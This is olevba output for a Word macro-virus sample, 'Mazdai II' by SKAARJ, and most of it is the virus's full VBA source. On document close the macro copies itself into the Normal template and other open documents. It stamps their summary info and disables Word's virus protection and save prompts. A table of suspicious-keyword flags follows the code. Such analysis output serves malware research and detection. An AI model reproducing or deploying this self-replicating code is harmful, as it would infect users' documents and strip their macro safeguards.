olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Skaarj
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Skaarj - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
    Const MarkSign = "Mazdai II (Free-Harm Built) Version 2.2 © SKAARJ Y2K"
    On Error GoTo handler
    Dim WDoc As Word.Document, M As Object, C As Object, Infected As Boolean, Found As Boolean
    Dim Saved As Boolean, Mon As String, Phrase As Byte, t As Long, i As Long, N As Boolean, Process As Byte
    Set M = Nothing
    N = False
    Process = 0
    Mon = GetSetting("Visdata", "Engines", "sizeX")
    If Mon = "" Then
        SaveSetting "Visdata", "Engines", "sizeX", Month(Now)
    ElseIf Mon - Month(Now) <> 0 Then
        If Rnd * 20 < 1 Then
            Do
                Phrase = Int(12 * Rnd)
            Loop While Phrase > 11
            Select Case Phrase
                Case 0: MsgBox "Nowhere to run, nowhere to hide ", vbExclamation, "Mazdai II"
                Case 1: MsgBox "Life is short - boost yourself", vbExclamation, "Mazdai II"
                Case 3: MsgBox "It's nice to be important, but it's more important to be nice ;-)" & vbCrLf & "Scooter", vbExclamation, "Mazdai II"
                Case 4: MsgBox "I have no mouth and I must scream", vbExclamation, "Mazdai II"
                Case 5: MsgBox "Death is not punishment - it is disposal", vbExclamation, "Mazdai II"
                Case 6: MsgBox "Trust no one", vbExclamation, "Mazdai II"
                Case 7: MsgBox "Forget the past - work for the future", vbExclamation, "Mazdai II"
                Case 8: MsgBox "Time is NOW!", vbExclamation, "Mazdai II"
                Case 9: MsgBox "SMILE! :~)", vbExclamation, "Mazdai II"
                Case 10: MsgBox "Touch the SKY!", vbExclamation, "Mazdai II"
                Case 11: MsgBox "The truth is out there", vbExclamation, "Mazdai II"
            End Select
        End If
    End If
    Found = False
    For Each C In NormalTemplate.VBProject.VBComponents
        If C.Type = 100 Then
            If C.CodeModule.Find(MarkSign, 1, 1, 100000, 100000) Then
                Found = True
                Set M = C.CodeModule
            End If
        End If
    Next
    Do
        For Each WDoc In Word.Documents
            If WDoc.SaveFormat = wdFormatDocument Or WDoc.SaveFormat = wdFormatTemplate Then
                For Each C In WDoc.VBProject.VBComponents
                    If C.Type = 100 Then
                        If C.CodeModule.Find(MarkSign, 1, 1, 100000, 100000) Then
                            Set M = C.CodeModule
                            Found = True
                        ElseIf Found Then
                            Saved = WDoc.Saved
                            On Error GoTo handler
                            t = C.CodeModule.ProcBodyLine("Document_Close", vbext_pk_Proc)
                            C.CodeModule.DeleteLines t, C.CodeModule.ProcCountLines("Document_Close", vbext_pk_Proc)
out:
                            C.CodeModule.InsertLines t, M.Lines(M.ProcBodyLine("Document_Close", vbext_pk_Proc), M.ProcCountLines("Document_Close", vbext_pk_Proc))
                            With Dialogs(wdDialogFileSummaryInfo)
                                .Title = "Surprise!!!"
                                .Author = "SKAARJ"
                                .Comments = "This is a second virus of SKAARJ from RUSSIA. This virus will not harm your system - it's only a test"
                                .Keywords = "SKAARJ, Virii, HTP, Experiment, Mazdai II"
                            End With
                            If Saved Then WDoc.Save
                            Infected = True
                        End If
                    End If
                Next
            End If
        Next
        Process = Process + 1
        If Process = 3 Then Exit Do
    Loop Until Infected
    If Found Then
        For Each C In NormalTemplate.VBProject.VBComponents
            If C.Type = 100 Then
                If Not C.CodeModule.Find(MarkSign, 1, 1, 100000, 100000) Then
                    Saved = NormalTemplate.Saved
                    N = True
                    t = C.CodeModule.ProcBodyLine("Document_Close", vbext_pk_Proc)
                    C.CodeModule.DeleteLines t, C.CodeModule.ProcCountLines("Document_Close", vbext_pk_Proc)
out1:
                    C.CodeModule.InsertLines t, M.Lines(M.ProcBodyLine("Document_Close", vbext_pk_Proc), M.ProcCountLines("Document_Close", vbext_pk_Proc))
                    If Saved Then NormalTemplate.Save
                End If
            End If
        Next
    End If
    With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
    Exit Sub
handler:
    t = 1
    If N = False Then
        Resume out
    Else
        Resume out1
    End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

